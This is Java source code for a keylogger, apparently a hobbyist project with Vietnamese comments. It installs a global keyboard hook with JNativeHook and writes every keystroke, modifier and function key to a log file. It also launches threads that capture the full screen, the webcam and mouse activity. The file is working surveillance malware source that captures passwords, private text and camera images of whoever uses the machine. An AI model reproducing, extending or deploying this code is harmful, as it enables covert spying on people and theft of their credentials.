package main;

import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.image.BufferedImage;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

    private String key;
    static WriteFile file;
    public static boolean shift = false;
    public static int countCapslk = 0;
    public static boolean capslk = false;

    public static void main(String args[]) throws IOException {
        // first. register globalscreem class to take event

        try {
            GlobalScreen.registerNativeHook(); // GlobalScreen is class global screen use your screen of jhook API java
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        //Gọi hàm addNativekey listener để lắng nghe key press.
        
        GlobalScreen.addNativeKeyListener(new Main()); // Chổ này không hiểu luôn. rảnh mở thưu viện ra coi lại
        System.out.println("le quang sang test global screen");

        // set deable all exception
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.ALL);
        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);

        // Khởi tạo đối tượng để ghi file.
        file = new WriteFile();

        // Khởi tạo Thread để chạy đa luồng trong java
        FullScreenCaptureExample screenCature = new FullScreenCaptureExample();
        Thread tScreen = new Thread(screenCature); // add đối tượng screenCapture vào luồng để chạy
        WebcamPanelExample webCam = new WebcamPanelExample();
        Thread tCam = new Thread(webCam); // webcam thread.
        
        MouseLisener mouse = new MouseLisener(); // khởi tạo luồng bắt chuộc
        Thread tMouse = new Thread(mouse);
        // run two thread. (????)
        
        
        tScreen.start();
        tCam.start();
        
        
        tMouse.start();

    }

    // đọc ghi vào file nhưng gì đã bắt
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // Check all exceptions because API not useful
        if (e.getKeyCode() == 57) // prees Space.
        {
            System.out.print(" "); // Display in the console
            try {
                file.writeFile(" "); // write key in the file (class WriteFile)
            } catch (IOException e1) {
                //e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 58) // press Caps Lock
        {
            System.out.print("[Cap]");
            try {
                file.writeFile("[Cap]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3638) // press left shift
        {
            System.out.print("[Shf]");
            try {
                file.writeFile("[Shf]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 42) // press right shift
        {
            System.out.print("[Shf]");
            try {
                file.writeFile("[Shf]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 28) //press enter
		 {
            System.out.print("\n");
            try {
                file.writeFile("\r\n");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 14) // press delelte
		 {
            System.out.print("[del]");
            try {
                file.writeFile("[del]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } // dealing period and slash"/"
        else if (e.getKeyCode() == 39) {
            System.out.print(";");
            try {
                file.writeFile(";");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 40) {
            System.out.print("'");
            try {
                file.writeFile("'");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 51) {
            System.out.print(",");
            try {
                file.writeFile(",");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 52) {
            System.out.print(".");
            try {
                file.writeFile(".");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 29) // press control
		{
            System.out.print("[Ctrl]");
            try {
                file.writeFile("[Ctrl]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 56) {
            System.out.print("[Alt]");
            try {
                file.writeFile("[Alt]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3675) {
            System.out.print("[Windows]");
            try {
                file.writeFile("[Windows]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3639) {
            System.out.print("[PrtSc]");
            try {
                file.writeFile("[PrtSc]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 53) {
            System.out.print("/");
            try {
                file.writeFile("/");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 15) {
            System.out.print("[tab]");
            try {
                file.writeFile("[tab]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 26) {
            System.out.print("[");
            try {
                file.writeFile("[");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 27) {
            System.out.print("]");
            try {
                file.writeFile("]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 43) {
            System.out.print("\\");
            try {
                file.writeFile("\\");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3677) {
            System.out.print("[Menu]");
            try {
                file.writeFile("[Menu]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 13) {
            System.out.print("[=]");
            try {
                file.writeFile("[=]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 12) {
            System.out.print("[-]");
            try {
                file.writeFile("[-]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 41) {
            System.out.print("[`]");
            try {
                file.writeFile("[`]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 1) {
            System.out.print("[Esc]");
            try {
                file.writeFile("[Esc]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 59) {
            System.out.print("[F1]");
            try {
                file.writeFile("[F1]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 60) {
            System.out.print("[F2]");
            try {
                file.writeFile("[F2]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 61) {
            System.out.print("[F3]");
            try {
                file.writeFile("[F3]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 62) {
            System.out.print("[F4]");
            try {
                file.writeFile("[F4]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 63) {
            System.out.print("[F5]");
            try {
                file.writeFile("[F5]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 64) {
            System.out.print("[F6]");
            try {
                file.writeFile("[F6]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 65) {
            System.out.print("[F7]");
            try {
                file.writeFile("[F7]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 66) {
            System.out.print("[F8]");
            try {
                file.writeFile("[F8]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 67) {
            System.out.print("[F9]");
            try {
                file.writeFile("[F9]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 68) {
            System.out.print("[F10]");
            try {
                file.writeFile("[F10]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 87) {
            System.out.print("[F11]");
            try {
                file.writeFile("[F11]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 88) {
            System.out.print("[F12]");
            try {
                file.writeFile("[F12]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3666) {
            System.out.print("[Insert]");
            try {
                file.writeFile("[Insert]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3667) {
            System.out.print("[Delete]");
            try {
                file.writeFile("[Delete]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 3653) {
            System.out.print("[Pause]");
            try {
                file.writeFile("[Pause]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else // when user press nomal key
		 {
            System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase()); // because API return upperCase
            key = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
            try {
                file.writeFile(key);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    }
    @Override
	// dealing native key released. 
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == 3638) {
            System.out.print("[uShf]");
            try {
                file.writeFile("[uShf]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 42) {
            System.out.print("[uShf]");
            try {
                file.writeFile("[uShf]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 58) {
            System.out.print("[uCap]");
            try {
                file.writeFile("[uCap]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 57419) {
            System.out.print("[left]");
            try {
                file.writeFile("[left]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 57421) {
            System.out.print("[right]");
            try {
                file.writeFile("[right]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 57416) {
            System.out.print("[up]");
            try {
                file.writeFile("[up]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 57424) {
            System.out.print("[down]");
            try {
                file.writeFile("[down]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } else if (e.getKeyCode() == 15) {
            System.out.print("[tab]");
            try {
                file.writeFile("[tab]");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
        System.out.println(" "+e.getKeyCode());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println(e.getKeyCode());

    }

}
